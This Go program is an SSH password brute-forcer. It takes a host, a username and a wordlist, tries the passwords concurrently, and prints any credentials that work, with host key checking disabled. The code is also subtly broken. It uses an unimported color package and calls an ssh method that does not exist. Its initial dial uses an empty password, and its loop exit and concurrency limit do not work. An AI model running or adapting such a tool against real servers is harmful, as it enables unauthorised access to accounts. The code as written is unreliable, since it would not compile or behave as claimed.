package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"

	"golang.org/x/crypto/ssh"
)

func main() {
	printHeader()

	// Command-line flags
	host := flag.String("host", "", "Target SSH server host")
	port := flag.Int("port", 22, "Target SSH server port")
	username := flag.String("username", "", "Target SSH server username")
	passwordFile := flag.String("password-file", "", "Path to the file containing the password list")
	verbose := flag.Bool("V", false, "Display password attempts")
	concurrency := flag.Int("concurrency", 10, "Number of concurrent connections")

	flag.Parse()

	// Validate required flags
	if *host == "" || *username == "" || *passwordFile == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Read password file
	passwords, err := readPasswords(*passwordFile)
	if err != nil {
		log.Fatalf("Failed to read password file: %s", err)
	}

	// Set up colored output
	successColor := color.New(color.FgGreen)
	failureColor := color.New(color.FgRed)

	// Create a wait group for managing the concurrency limit
	var wg sync.WaitGroup

	// Create a cancellation context
	ctx, cancel := context.WithCancel(context.Background())

	// Create an SSH client configuration
	config := &ssh.ClientConfig{
		User: *username,
		Auth: []ssh.AuthMethod{
			ssh.Password(""),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	// Attempt SSH connection
	conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port), config)
	if err != nil {
		log.Fatalf("Failed to connect to SSH server: %s", err)
	}
	defer conn.Close()

	for _, password := range passwords {
		// Check if the context has been cancelled (successful login found)
		select {
		case <-ctx.Done():
			break
		default:
			// Acquire a wait group counter
			wg.Add(1)

			go func(password string) {
				defer wg.Done()

				// Set the password for the SSH client config
				config.Auth[0] = ssh.Password(password)

				// Attempt SSH authentication
				err := conn.Authenticate(config)
				if err == nil {
					// Successful login found, cancel other login attempts
					cancel()

					successColor.Printf("Successful login! Username: %s, Password: %s\n", *username, password)
				} else if *verbose {
					failureColor.Printf("Login failed! Password: %s, Error: %s\n", password, err)
				}
			}(password)
		}
	}

	// Wait for all goroutines to finish
	wg.Wait()
}

// Read password file and return a list of passwords
func readPasswords(passwordFile string) ([]string, error) {
	file, err := os.Open(passwordFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var passwords []string
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return passwords, nil
}

// Print the program header
func printHeader() {
	header := `
 _/_/_/  _/        _/  _/      _/
_/    _/  _/        _/  _/_/    _/    _/    _/  _/
_/    _/  _/        _/  _/  _/  _/    _/      _/
_/    _/  _/        _/  _/    _/_/    _/      _/
 _/_/_/    _/_/_/  _/  _/      _/  _/_/_/  _/    _/

`

	fmt.Println(header)
}
